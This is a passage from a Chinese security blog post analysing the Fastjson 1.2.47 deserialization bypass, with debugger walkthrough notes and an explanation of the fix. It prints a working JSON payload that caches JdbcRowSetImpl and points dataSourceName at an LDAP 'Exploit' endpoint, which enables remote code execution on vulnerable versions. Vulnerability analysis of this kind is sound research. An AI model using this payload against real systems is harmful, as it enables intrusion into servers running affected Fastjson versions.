+<h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>无需开启<code>autotype</code>通杀1.2.48以下所有，有传言在autotype开启的情况下可以打到1.2.57：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>, <br>        <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;, <br>    <span class="hljs-attr">&quot;b&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, <br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>断点如下：</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140337580.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140352482.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140824351.png" srcset="/img/loading.gif" lazyload></p>
+<p>解析到字段a，步进</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324151509785.png" srcset="/img/loading.gif" lazyload></p>
+<p>在checkAutoType方法<code>TypeUtils.getClassFromMapping(typeName)</code>以及<code>deserializers.findClass(typeName)</code></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324160340283.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一个方法，返回<code>(Class)mappings.get(className)</code></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324152509308.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>deserializers.findClass(typeName)</code>在getName获得类名，然后与传入的相比较并返回</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324152757662.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后还没到<code>autoTypeSupport</code>就return clazz了</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324161558201.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用的反序列化类</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324162612574.png" srcset="/img/loading.gif" lazyload></p>
+<p>MiscCodec来到304<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324164412464.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324164450203.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着就是第二段的<code>checkAutoType</code>，从mappings拿到<code>com.sun.rowset.JdbcRowSetImpl</code>，同样还没到<code>autoTypeSupport</code>验证拿到的<code>com.sun.rowset.JdbcRowSetImpl</code>就return clazz</p>
+<p>修复将<code>loadClass</code>中的cache设置为false，在第一次获取到<code>com.sun.rowset.JdbcRowSetImpl</code>这个类之后就不会缓存，到第二次的payload时也就取不到缓存的类，也就会进入到黑名单和<code>com.sun.rowset.JdbcRowSetImpl</code>的验证中。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/language/">language</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/03/15/Unsafe/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/11/%E5%88%9D%E6%8E%A2Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">
+                        <span class="hidden-mobile">初探Docker容器逃逸</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-SL9T1KRBQY', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
